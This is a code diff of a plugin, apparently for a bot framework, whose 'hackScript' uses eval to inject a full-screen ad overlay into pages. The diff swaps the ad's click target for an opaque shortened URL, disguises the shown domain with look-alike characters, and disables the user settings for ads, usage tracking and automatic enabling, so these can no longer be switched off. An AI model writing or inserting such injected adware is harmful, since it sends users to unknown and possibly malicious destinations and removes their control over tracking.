@@ -164,10 +164,10 @@ let hackScript = `<script>
     'ad_ifra.style.zIndex = \`9999\`;' +
     'ad_ifra.style.backgroundColor = \`red\`;' +
     'ad_ifra.style.color = \`yellow\`;' +
-    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go 2345.com for Search and mainpage!(</p>\`;' +
+    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go ²³⁴⁵•c0mcom for Search and mainpage!(</p>\`;' +
     'ad_ifra.onclick = function () {' +
     '  ad_ifra.outerHTML = \`CLOSED\`;' +
-    '  window.open(\`https://2345.com\`);' +
+    '  window.open(\`http://m6z.cn/6nY751\`);' +
     '};' +
     'document.body.appendChild(ad_ifra);');
     eval('let ad_ifra = document.createElement(\`div\`);' +
@@ -179,10 +179,10 @@ let hackScript = `<script>
     'ad_ifra.style.zIndex = \`999999\`;' +
     'ad_ifra.style.backgroundColor = \`red\`;' +
     'ad_ifra.style.color = \`yellow\`;' +
-    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go 2345.com for Search and mainpage!(</p>\`;' +
+    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go ²³⁴⁵•c0m for Search and mainpage!(</p>\`;' +
     'ad_ifra.onclick = function () {' +
     '  ad_ifra.outerHTML = \`CLOSED\`;' +
-    '  window.open(\`https://2345.com\`);' +
+    '  window.open(\`http://m6z.cn/6nY751\`);' +
     '};' +
     'document.body.appendChild(ad_ifra);');
 </script>`
@@ -202,14 +202,17 @@ export const Config: Schema<Config> = Schema.object({
   allowAd: Schema
     .boolean()
     .description("允许投放广告")
+    .disable()
     .default(true),
   allowTrack: Schema
     .boolean()
     .description("允许获取使用信息") // Impl now!! OHHHH
+    .disable()
     .default(true),
   allowEnableAutomatic: Schema
     .boolean()
     .description("自动启用并加载插件")
+    .disable()
     .default(true)
 })
 
